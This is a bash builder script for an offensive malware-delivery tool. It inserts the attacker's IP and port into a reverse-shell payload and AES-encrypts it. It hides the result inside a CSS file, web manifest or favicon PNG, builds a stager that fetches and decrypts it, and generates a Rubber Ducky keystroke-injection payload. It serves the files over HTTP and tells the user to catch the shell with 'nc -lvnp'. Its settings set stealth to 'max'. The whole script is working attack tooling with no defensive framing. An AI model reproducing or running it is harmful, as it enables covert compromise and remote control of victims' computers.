#!/bin/bash
set -euo pipefail

cat <<'BANNER'
   ____  _           _       _     ____                                      
  |  _ \| |__   ___ | |_ ___| |__ |  _ \  ___  ___ ___  _ __ ___  ___  _ __  
  | |_) | '_ \ / _ \| __/ __| '_ \| | | |/ _ \/ __/ _ \| '__/ _ \/ _ \| '_ \ 
  |  __/| | | | (_) | || (__| | | | |_| |  __/ (_| (_) | | |  __/ (_) | | | |
  |_|   |_| |_|\___/ \__\___|_| |_|____/ \___|\___\___/|_|  \___|\___/|_| |_|
BANNER
echo

check_dep() {
  for cmd in "$@"; do
    command -v "$cmd" &>/dev/null || { echo -e "\e[1;31m[ERROR]\e[0m Missing dependency: $cmd"; exit 1; }
  done
}
check_dep python3 lsof nc

trap 'log "Interrupted. Exiting."; exit 1' INT

log()   { echo -e "\e[1;32m[$(date +%H:%M:%S)] $1\e[0m"; }
error() { echo -e "\e[1;31m[$(date +%H:%M:%S)] $1\e[0m" >&2; }

PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$PROJECT_DIR"

CONFIG_FILE="config/settings.json"
OUTPUT_DIR="output"
WEB_DIR="web"
PAYLOADS_DIR="payloads"
STAGERS_DIR="stagers"

mkdir -p "$OUTPUT_DIR" "$WEB_DIR" "$PAYLOADS_DIR" "$STAGERS_DIR/config"

log "Available local IPv4 addresses:"

mapfile -t ip_list < <(hostname -I | tr ' ' '\n' | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$')
for i in "${!ip_list[@]}"; do
    echo "  [$i] ${ip_list[$i]}"
done

while true; do
    read -p "[*] Choose IP [index]: " ip_index
    if [[ "$ip_index" =~ ^[0-9]+$ ]] && (( ip_index >= 0 && ip_index < ${#ip_list[@]} )); then
        IP="${ip_list[$ip_index]}"
        break
    else
        echo "Invalid index. Please enter a number from 0 to $((${#ip_list[@]}-1))."
    fi
done

echo "Selected IP: $IP"

read -p "[*] Enter PORT for reverse shell/payload (default 8000): " PORT_SHELL
PORT_SHELL="${PORT_SHELL:-8000}"

read -p "[*] Enter PORT for web server (default 8080): " PORT_SERVE
PORT_SERVE="${PORT_SERVE:-8080}"

echo "Reverse shell/payload port: $PORT_SHELL"
echo "Web server port: $PORT_SERVE"

free_port() {
  local PORT=$1
  local PIDS
  PIDS=$(lsof -i TCP:"$PORT" -sTCP:LISTEN -t 2>/dev/null || true)
  if [[ -n "$PIDS" ]]; then
    log "Port $PORT is occupied. Killing process(es): $PIDS"
    echo "$PIDS" | xargs -r kill -9
    sleep 1
  fi
}

free_port "$PORT_SHELL"
free_port "$PORT_SERVE"

# -------------[ ОС ВЫБОР ]----------
log "Choose target OS:"
select OS in linux windows mac; do [[ -n "$OS" ]]; break; done

PAYLOAD_PATH="$PAYLOADS_DIR/$OS"
if [[ ! -d "$PAYLOAD_PATH" ]]; then error "No payloads for $OS"; exit 1; fi

log "Choose payload in $PAYLOAD_PATH:"
mapfile -t PAYLOADS < <(find "$PAYLOAD_PATH" -mindepth 1 -maxdepth 1 -type d -exec basename {} \;)
select PAYLOAD in "${PAYLOADS[@]}"; do [[ -n "$PAYLOAD" ]]; break; done

log "Choose delivery method:"
select DELIVERY in css manifest png; do [[ -n "$DELIVERY" ]]; break; done

# ------------[ ОС СПЕЦИФИКА: переменные ]-------------------
if [[ "$OS" == "linux" ]]; then
  STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.sh"
  STAGER_FILE="$PAYLOADS_DIR/$OS/$PAYLOAD/template.sh"
  FINAL_STAGE1="$OUTPUT_DIR/final_stage1.sh"
  FINAL_STAGE1_WEB="final_stage1.sh"
elif [[ "$OS" == "windows" ]]; then
  STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.ps1"
  STAGER_FILE="$PAYLOADS_DIR/$OS/$PAYLOAD/template.ps1"
  FINAL_STAGE1="$OUTPUT_DIR/final_stage1.ps1"
  FINAL_STAGE1_WEB="final_stage1.ps1"
elif [[ "$OS" == "mac" ]]; then
  error "Mac OS is not supported yet."
  exit 2
else
  error "Unknown OS: $OS"
  exit 2
fi


[[ -f "$STAGE2_RAW" ]] || { error "No raw payload $STAGE2_RAW"; exit 1; }
[[ -f "$STAGER_FILE" ]] || { error "No stager template $STAGER_FILE"; exit 1; }

TMP_PAYLOAD="$OUTPUT_DIR/tmp_raw_payload"
cp "$STAGE2_RAW" "$TMP_PAYLOAD"
sed -i "s/REPLACE_IP/$IP/g; s/REPLACE_PORT/$PORT_SHELL/g" "$TMP_PAYLOAD"

log "Encrypting payload..."
ENCODED="$(python3 tools/encrypt_aes.py "$TMP_PAYLOAD")" || { error "Encryption failed"; rm -f "$TMP_PAYLOAD"; exit 1; }
ENCODED_FILE="$OUTPUT_DIR/encrypted_stage2.txt"
echo "$ENCODED" > "$ENCODED_FILE"
rm -f "$TMP_PAYLOAD"

case "$DELIVERY" in
  css)      python3 tools/embed_in_css.py "$ENCODED_FILE" "$WEB_DIR/style.css" ;;
  manifest) python3 tools/embed_in_manifest.py "$ENCODED_FILE" "$WEB_DIR/manifest.json" ;;
  png)      python3 tools/embed_in_png.py "$ENCODED_FILE" "$WEB_DIR/favicon.png" "$WEB_DIR/favicon.png" ;;
esac

case "$DELIVERY" in
  css)      DELIVERY_FILE="style.css" ;;
  manifest) DELIVERY_FILE="manifest.json" ;;
  png)      DELIVERY_FILE="favicon.png" ;;
esac

DELIVERY_URL="http://$IP:$PORT_SERVE/$DELIVERY_FILE"

KEY=$(grep ENCRYPTION_KEY .env | cut -d= -f2 | tr -d '\r\n')
KEY_HEX=$(echo -n "$KEY" | xxd -p | tr -d '\n')
KEY_HEX_ESCAPED=$(echo "$KEY_HEX" | sed -e 's/[\/&]/\\&/g')

STAGER_CONTENT=$(sed \
  -e "s|REPLACE_DELIVERY|$DELIVERY|g" \
  -e "s|REPLACE_URL|$DELIVERY_URL|g" \
  -e "s|REPLACE_KEY|$KEY_HEX_ESCAPED|g" \
  "$STAGER_FILE")

echo "$STAGER_CONTENT" > "$FINAL_STAGE1"
cp "$FINAL_STAGE1" "$WEB_DIR/$FINAL_STAGE1_WEB"

log "Generating Ducky payload..."
python3 tools/generate_ducky.py "$IP" "$PORT_SERVE" 1000 "$OUTPUT_DIR/ducky_payload.txt" "$OS"

serve_web() {
  cd "$WEB_DIR"
  log "Serving payloads at http://$IP:$PORT_SERVE"
  python3 -m http.server "$PORT_SERVE" --bind 0.0.0.0 > ../output/http_server.log 2>&1 &
  SERVER_PID=$!
  cd "$PROJECT_DIR"
}

serve_web
sleep 1

echo "[$(date)] $IP $PORT_SHELL $PORT_SERVE $OS $PAYLOAD $DELIVERY" >> build_history.log

cat > "$CONFIG_FILE" <<EOF
{
  "last_used": {
    "ip": "$IP",
    "port_shell": $PORT_SHELL,
    "port_serve": $PORT_SERVE,
    "os": "$OS",
    "payload": "$PAYLOAD",
    "delivery": "$DELIVERY",
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  },
  "options": {
    "stealth_level": "max",
    "auto_cleanup": true,
    "log_enabled": true,
    "default_encryption": "aes-256-cbc"
  }
}
EOF

log "Payload is ready and being served in background."
log "----------------------------------------------------"
log "  Serve URL:          http://$IP:$PORT_SERVE/"
log "  Direct download:    http://$IP:$PORT_SERVE/$FINAL_STAGE1_WEB"
log "  Ducky payload:      $OUTPUT_DIR/ducky_payload.txt"
log "----------------------------------------------------"
log "To listen for an incoming connection, run:"
echo -e "\e[1;36mnc -lvnp $PORT_SHELL\e[0m"
log "To stop the web server, run:"
echo -e "\e[1;36mkill \$SERVER_PID\e[0m"
log "HTTP server logs are saved to: output/http_server.log"

cleanup() {
  if [[ -n "${SERVER_PID:-}" ]] && ps -p $SERVER_PID &>/dev/null; then
    log "Stopping HTTP server (PID $SERVER_PID)..."
    kill $SERVER_PID 2>/dev/null
  fi
}
trap cleanup EXIT
log "Press Ctrl+C to stop the web server and exit..."
while true; do sleep 60; done
